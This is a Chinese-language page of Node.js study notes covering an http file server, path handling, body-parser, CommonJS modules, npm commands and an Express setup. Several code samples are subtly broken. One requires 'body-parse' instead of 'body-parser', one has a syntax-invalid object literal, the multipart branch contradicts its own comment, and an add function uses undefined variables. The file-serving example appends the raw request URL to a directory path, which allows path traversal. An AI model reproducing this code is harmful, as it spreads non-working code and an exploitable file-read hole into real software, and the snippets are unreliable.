class="line"><span class="comment">//监听request事件</span></span><br><span class="line">server.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> url = req.url;</span><br><span class="line"><span class="keyword">if</span>(url === <span class="string">'/index'</span>)&#123;</span><br><span class="line"><span class="comment">//读取页面文件</span></span><br><span class="line">fs.readFile(<span class="string">'09-data/abc.html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'读取文件失败'</span>)</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'text/html; charset=utf-8'</span>)</span><br><span class="line">res.end(data.toString())</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (url === <span class="string">'/img'</span>) &#123;</span><br><span class="line"><span class="comment">//读取图像文件</span></span><br><span class="line">fs.readFile(<span class="string">'09-data/601db542da7bc1d7ecbfb218685332a.jpg'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(err) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'无法读取该文件'</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'image/jpeg'</span>)</span><br><span class="line">res.end(data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.end(<span class="string">'404'</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//绑定端口号，启动服务</span></span><br><span class="line">server.listen(<span class="string">'3000'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'server is running'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="浏览器输入路径打开文件"><a href="#浏览器输入路径打开文件" class="headerlink" title="浏览器输入路径打开文件"></a>浏览器输入路径打开文件</h3><p>​    需求：用户在浏览器输入文件名即可访问该文件内容</p><ol><li>将用户输入的文件转化为fs所找文件路径</li><li>fs读取文件</li><li>res响应文件内容</li><li>输出文件内容</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="comment">//创建服务</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer()</span><br><span class="line"><span class="comment">//监听request事件</span></span><br><span class="line">server.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> www = <span class="string">'C:/Users/12524/Desktop/Node.JS'</span></span><br><span class="line">    <span class="keyword">var</span> url = req.url <span class="comment">//不能为中文路径</span></span><br><span class="line">    fs.readFile(www + url, <span class="string">"GBK"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.end(<span class="string">'404,nod found'</span>) <span class="comment">//return停止代码执行</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.end(data)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//设置端口号，发布服务</span></span><br><span class="line">server.listen(<span class="string">'3000'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server is running'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><h3 id="状态码301和302"><a href="#状态码301和302" class="headerlink" title="状态码301和302"></a>状态码301和302</h3><p>301</p><ul><li>永久性的重定向，搜索引擎在抓取新内容的同时将旧网址替换为重定向之后的网址</li></ul><p>302</p><ul><li>暂时性跳转，搜索引擎抓取新的内容的同时保留旧网址</li><li>服务器返回302时，搜索引擎认为新网址时暂时的</li></ul><h1 id="path"><a href="#path" class="headerlink" title="path"></a>path</h1><p>路径操作模块</p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><blockquote><p>官方文档：<a href="https://nodejs.org/docs/latest-v13.x/api/path.html" target="_blank" rel="noopener">https://nodejs.org/docs/latest-v13.x/api/path.html</a></p></blockquote><ul><li>path.basename：获取路径的文件名，默认包含扩展名</li><li>path.dirname：获取路径中的目录部分</li><li>path.extname：获取一个路径中的扩展名部分</li><li>path.parse：把路径转换为对象<ul><li>root：根路径</li><li>dir：目录</li><li>base：包含后缀名的文件名</li><li>ext：后缀名</li><li>name：不包含后缀名的文件名</li></ul></li><li>🔺path.join：拼接路径（第二个参数会自动判断/是否多余）</li><li>path.isAbsolute：判断一个路径是否为绝对路径</li></ul><h1 id="body-parser"><a href="#body-parser" class="headerlink" title="body-parser"></a>body-parser</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>body post解析中间件</p><p>处理程序之前，在中间件中对传入的请求体进行解析（response body）</p><p>处理post请求体</p><p><code>body-parser</code> 提供四种解析器<br> JSON body parser<br> Raw body parser<br> Text body parser<br> URL-encoded form body parser</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i body-parser</span><br></pre></td></tr></table></figure><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bodyParse = <span class="built_in">require</span>(<span class="string">"body-parse"</span>)</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// parse application/x-www-form-urlencoded</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line"><span class="comment">// parse application/json</span></span><br><span class="line">app.use(bodyParser.json())</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">'/login'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.body)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="原生获取post请求体方式"><a href="#原生获取post请求体方式" class="headerlink" title="原生获取post请求体方式"></a>原生获取post请求体方式</h2><p>记得先引入<code>querystring</code>模块</p><p><code>querystring</code>用作分割请求体内容并转化为对象格式</p><p>因为有时候会用到文件上传，所以这里要判断数据请求头的<code>content-type</code>，如果是<code>multipart/form-data</code>，则让<code>formidable</code>中间件去处理，否则自己处理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">``</span></span><br><span class="line">    <span class="keyword">if</span> (req.method.toLowerCase() === <span class="string">'get'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果是有文件的表单POST，则不处理</span></span><br><span class="line">    <span class="keyword">if</span> (req.headers[<span class="string">'content-type'</span>].startsWith(<span class="string">'multipart/form-data'</span>)) &#123;</span><br><span class="line">        req.on(<span class="string">'data'</span>, chunk =&gt; &#123;</span><br><span class="line">            data += chunk</span><br><span class="line">        &#125;)</span><br><span class="line">        req.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">            req.body = queryString.parse(data)</span><br><span class="line">            next()</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="node中的其他成员"><a href="#node中的其他成员" class="headerlink" title="node中的其他成员"></a>node中的其他成员</h1><h2 id="dirname-filename"><a href="#dirname-filename" class="headerlink" title="__dirname() __filename"></a>__dirname() __filename</h2><ul><li>__dirname:<strong>动态</strong>获取当前模块文件<strong>所处目录</strong>的绝对路径</li><li>__filename: <strong>动态</strong>获取当前<strong>文件</strong>的绝对路径</li></ul><p>在文件操作中，使用相对路径是不可靠的，因为node中文件操作的路径被设计为相对于执行node命令所处的路径。为了解决这个问题，需要使用<code>__dirname()</code>或 <code>__filename</code>把相对路径变为绝对路径（绝对路径不受任何影响）。</p><p>在拼接路径的过程中，为了避免手动拼接带来的一些错误，就可以使用<code>path.join()</code>来辅助拼接</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//path会将路径名和文件名拼接起来且能识别适应文件名前路径形式</span></span><br><span class="line">fs.readFile(path.join(__dirname, <span class="string">'a.txt'</span>), <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'error'</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="built_in">console</span>.log(path.join(__dirname, <span class="string">'./a.txt'</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><p><strong>模块中的路径标识和文件操作中的相对路径标识不一致</strong></p><p><strong>模块中的路径标识就是相对于当前文件模块，不受node命令所处路径影响</strong></p><h1 id="node中的模块系统"><a href="#node中的模块系统" class="headerlink" title="node中的模块系统"></a>node中的模块系统</h1><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><h3 id="何为模块化"><a href="#何为模块化" class="headerlink" title="何为模块化"></a>何为模块化</h3><ul><li>文件作用域(模块是独立的，在不同的文件使用必须要重新引用)<ul><li><strong>注意:</strong> <strong>在node中没有全局作用域，它是文件模块作用域</strong></li></ul></li><li>通信规则<ul><li>加载: require</li><li>导出: exports</li></ul></li></ul><h3 id="模块类型"><a href="#模块类型" class="headerlink" title="模块类型"></a>模块类型</h3><ul><li>核心模块<ul><li>文件操作的fs</li><li>http服务操作的http</li><li>url路径操作模块</li><li>path路径处理模块</li><li>os操作系统信息</li><li>……</li></ul></li><li>第三方模块<ul><li>art-template</li><li>必须通过npm来下载才可以使用</li></ul></li><li>自己写的模块<ul><li>自己创建的文件</li></ul></li></ul><h3 id="模块标识"><a href="#模块标识" class="headerlink" title="模块标识"></a>模块标识</h3><p><code>./</code> 相对于当前路径（在文件操作中可省略）</p><p><code>/</code>在当前模块所处的磁盘根目录</p><h2 id="javascript模块化（需补充）"><a href="#javascript模块化（需补充）" class="headerlink" title="javascript模块化（需补充）"></a>javascript模块化（需补充）</h2><ul><li>Node 中的 CommonJS</li><li>浏览器中的：<ul><li>AMD require.js</li><li>CMD sea.js</li></ul></li><li>es6中增加了官方支持</li></ul><h2 id="CommonJS模块规范"><a href="#CommonJS模块规范" class="headerlink" title="CommonJS模块规范"></a>CommonJS模块规范</h2><ul><li>模块作用域</li><li>使用require方法来加载模块</li><li>使用exports接口对象来导出模板中的成员</li></ul><h3 id="加载require"><a href="#加载require" class="headerlink" title="加载require"></a>加载<code>require</code></h3><p>使用<code>require</code>函数加载模块</p><ul><li><p>若调用<strong>非</strong>核心模块和第三方模块，必须加上相对路径<code>./</code>,可以省略后缀名</p></li><li><p><code>require</code>作用</p><ul><li>加载文件模块并执行里面的代码</li><li>拿到被加载文件模块导出的接口对象</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br></pre></td></tr></table></figure><h3 id="require方法加载规则"><a href="#require方法加载规则" class="headerlink" title="require方法加载规则"></a>require方法加载规则</h3><ul><li>优先从缓存加载（即不会重复调用同个模块中的函数）<ul><li>避免重复加载，提高模块加载效率</li><li>node会自动寻找当前文件路径的node_modules,从而加载第三方包，若没有，则会继续往上一级目录找，直到找到（如没找到则报错）</li></ul></li></ul><p>main.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'./a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优先从缓存加载</span></span><br><span class="line"><span class="comment">// 由于 在 a 中已经加载过 b 了</span></span><br><span class="line"><span class="comment">// 所以这里不会重复加载</span></span><br><span class="line"><span class="comment">// 可以拿到其中的接口对象，但是不会重复执行里面的代码</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="built_in">require</span>(<span class="string">'./b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(fn)</span><br></pre></td></tr></table></figure><p>a.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'a.js 被加载了'</span>)</span><br><span class="line"><span class="keyword">var</span> fn = <span class="built_in">require</span>(<span class="string">'./b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(fn)</span><br></pre></td></tr></table></figure><p>b.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'b.js 被加载了'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello bbb'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第三方模块加载过程"><a href="#第三方模块加载过程" class="headerlink" title="第三方模块加载过程"></a>第三方模块加载过程</h3><p>art-template为例</p><ol><li>先找到当前项目路径的node_modules</li><li>node-modules/art-template</li><li>node-modules/art-template/package.json</li><li>找到说明文件中的main属性<ul><li>main属性记录art-template的入口模块</li></ul></li><li>加载使用这个第三方包<ul><li>实际加载的还是index.js文件</li></ul></li><li>若，package.json或main指定的入口模块不存在则node会找该目录下的index.js文件</li><li>条件均不满足则自动往上一级目录查找</li></ol><h3 id="导出exports"><a href="#导出exports" class="headerlink" title="导出exports"></a>导出<code>exports</code></h3><p>使用<code>exports</code>函数导出需被外部访问的成员</p><ul><li><code>exports</code><ul><li>在每个文件模块中都提供了一个对象：exports</li><li>exports 默认是一个空对象</li><li>将需被外部访问的成员挂载到这个 exports 对象中</li></ul></li></ul><p>导出多个成员</p><p>方法一</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exports.a = <span class="number">123</span>;</span><br><span class="line">exports.b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'bbb'</span>)</span><br><span class="line">&#125;;</span><br><span class="line">exports.c = &#123;</span><br><span class="line">    foo:<span class="string">"bar"</span></span><br><span class="line">&#125;;</span><br><span class="line">exports.d = <span class="string">'hello'</span>;</span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    foo = <span class="string">'hello'</span>,</span><br><span class="line">    add:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>导出单个成员（这时引用该模块，直接返回hello字符串）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="string">'hello'</span>;</span><br></pre></td></tr></table></figure><p>案例：假设存在a模块和b模块，现在要用a模块访问b模块的成员</p><p>a模块：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'hello,i am a'</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">require</span>(<span class="string">'./b.js'</span>);<span class="comment">//调用该模块的同时，将该模块内容引入</span></span><br><span class="line"><span class="comment">// require('./b.js');</span></span><br><span class="line"><span class="built_in">console</span>.log(b.bbb(<span class="number">10</span>,<span class="number">20</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'bye,a are leave'</span>);</span><br></pre></td></tr></table></figure><p>b模块：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var c = require('./c');</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'hello,i am b.'</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./c'</span>);</span><br><span class="line">exports.bbb = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'bye,b are leave'</span>);</span><br></pre></td></tr></table></figure><p>c模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'hello,i am c'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'bye,c are leave'</span>);</span><br></pre></td></tr></table></figure><p>结果</p><p><img src= "/img/loading.gif" data-src="/2020/07/10/Node.JS/image-20200502145729142.png" alt="image-20200502145729142"></p><h3 id="module-exports和exports的关系"><a href="#module-exports和exports的关系" class="headerlink" title="module.exports和exports的关系"></a>module.exports和exports的关系</h3><p>真正要导出数据是module.exports，而node为了方便我们操作，所以指定了一个变量exports等同于module.exports，，如下代码所示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exports = <span class="built_in">module</span>.exports</span><br></pre></td></tr></table></figure><p>所以</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exports.a = <span class="number">2</span></span><br><span class="line">exports.b = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>这些值最终会等同于module.exports.a = 2和module.exports.a = 3，同时会被导出</p><p>但如果，你这样写代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exports = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>那么，你相当于改了exports的值，那么它就会与module.exports分道扬镳，它的值也不会等于module导出的值</p><p>所以，为了保险起见，新手最好使用module.exports导出你要导出的内容，避免错误</p><h1 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>NPM是随同NodeJS一起安装的包管理工具，能解决NodeJS代码部署上的很多问题，常见的使用场景有以下几种：</p><ul><li>允许用户从NPM服务器下载别人编写的第三方包到本地使用。</li><li>允许用户从NPM服务器下载并安装别人编写的命令行程序到本地使用。</li><li>允许用户将自己编写的包或命令行程序上传到NPM服务器供别人使用。</li></ul><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><p>npmjs.com 网站 是用来搜索npm包的</p><h2 id="npm命令行工具"><a href="#npm命令行工具" class="headerlink" title="npm命令行工具"></a>npm命令行工具</h2><p>npm也有版本概念，可以通过<code>npm --version</code>来查看npm的版本</p><p>升级npm(自己升级自己)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --global npm</span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li><p>npm init(生成package.json说明书文件)</p></li><li><p>npm init -y(可以跳过向导，快速生成)</p></li><li><p>npm install</p><ul><li>一次性把dependencies选项中的依赖项全部安装</li><li>简写（npm i）</li></ul></li><li><p>npm install 包名</p><ul><li>只下载</li><li>简写（npm i 包名）</li></ul></li><li><p>npm install –save 包名</p><ul><li>下载并且保存依赖项（package.json文件中的dependencies选项）</li><li>简写（npm i 包名）</li><li>–save 自动生成说明说文件信息package.json</li><li>文件信息自动添加至package.json</li><li>若删除掉某些项目使用的模块但有保留package.json，则可在命令行（当前项目文件夹下）执行 npm install 全部自动下回来</li></ul></li><li><p>npm uninstall 包名</p><ul><li>只删除，如果有依赖项会依然保存</li><li>简写（npm un 包名）</li></ul></li><li><p>npm uninstall –save 包名</p><ul><li>删除的同时也会把依赖信息全部删除</li><li>简写（npm un 包名）</li></ul></li><li><p>npm help</p><ul><li>查看使用帮助</li></ul></li><li><p>npm 命令 –help</p><ul><li>查看具体命令的使用帮助（npm uninstall –help）</li></ul></li></ul><h2 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h2><p>每一个项目都要有一个<code>package.json</code>文件（包描述文件，就像产品的说明书一样）</p><p>这个文件可以通过<code>npm init</code>自动初始化出来</p><p>对于目前来讲，最有用的是<code>dependencies</code>选项，可以用来帮助我们保存第三方包的依赖信息。</p><p>如果<code>node_modules</code>删除了也不用担心，只需要在控制面板中<code>npm install</code>就会自动把<code>package.json</code>中的<code>dependencies</code>中所有的依赖项全部都下载回来。</p><ul><li>建议每个项目的根目录下都有一个<code>package.json</code>文件</li><li>建议执行<code>npm install 包名</code>的时候都加上<code>--save</code>选项，目的是用来保存依赖信息</li></ul><h3 id="package-json和package-lock-json"><a href="#package-json和package-lock-json" class="headerlink" title="package.json和package-lock.json"></a>package.json和package-lock.json</h3><p>npm 5以前是不会有<code>package-lock.json</code>这个文件</p><p>npm5以后才加入这个文件</p><p>当你安装包的时候，npm都会生成或者更新<code>package-lock.json</code>这个文件</p><h3 id="package-json用处"><a href="#package-json用处" class="headerlink" title="package.json用处"></a>package.json用处</h3><ol><li>提升下载速度<ul><li>npm5以后的版本安装都不要加<code>--save</code>参数，它会自动保存依赖信息</li><li>当你安装包的时候，会自动创建或者更新<code>package-lock.json</code>文件，这个文件会包含<code>node_modules</code>中所有包的信息（版本，下载地址等），这样的话重新<code>npm install</code>的时候速度就可以提升</li></ul></li><li>锁定版本号<ul><li>从文件来看，有一个lock，称之为锁</li><li>这个<code>lock</code>使用来锁版本的</li><li>如果项目依赖了<code>1.1.1</code>版本</li><li>如果你重新install其实会下载最新版本，而不是`1.1.1``</li><li>``package-lock.json`的另外一个作用就是锁定版本号，防止自动升级</li></ul></li></ol><h1 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h1><p>案例：express留言板、学生信息增删改</p><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>Express 是一个简洁而灵活的 Node.JS Web应用框架, 提供了一系列强大特性帮助你创建各种 Web 应用，和丰富的 HTTP 工具。</p><p>使用 Express 可以快速地搭建一个完整功能的网站。</p><p>Express 框架核心特性：</p><ul><li>可以设置中间件来响应 HTTP 请求。</li><li>定义了路由表用于执行不同的 HTTP 请求动作。</li><li>可以通过向模板传递参数来动态渲染 HTML 页面。</li></ul><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm init //生成说明文件</span><br><span class="line">npm install --save express</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/07/10/Node.JS/image-20200509202639542.png" alt="image-20200509202639542"></p><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><ol><li>引包</li><li>创建服务器应用程序</li><li>接受请求，返回响应</li><li>发布服务</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引包</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务</span></span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">//开放文件路径</span></span><br><span class="line">app.use(<span class="string">'/public'</span>, express.static(<span class="string">'./public/'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收请求，返回响应</span></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">res.send(<span class="string">'成功啦！'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//发布服务</span></span><br><span class="line">app.listen(<span class="string">'3000'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'server is running...'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="art-template"><a href="#art-template" class="headerlink" title="art-template"></a>art-template</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --sava art-template</span><br><span class="line">npm install -save express-art-template</span><br></pre></td></tr></table></figure><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.engine(<span class="string">'html'</span>, <span class="built_in">require</span>(<span class="string">'express-art-template'</span>))</span><br><span class="line">app.set(<span class="string">'/views'</span>, <span class="string">'./views/'</span>) <span class="comment">//可以更改模板引擎默认调用资源文件夹路径,注意书写</span></span><br></pre></td></tr></table></figure><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><figure class="highlight 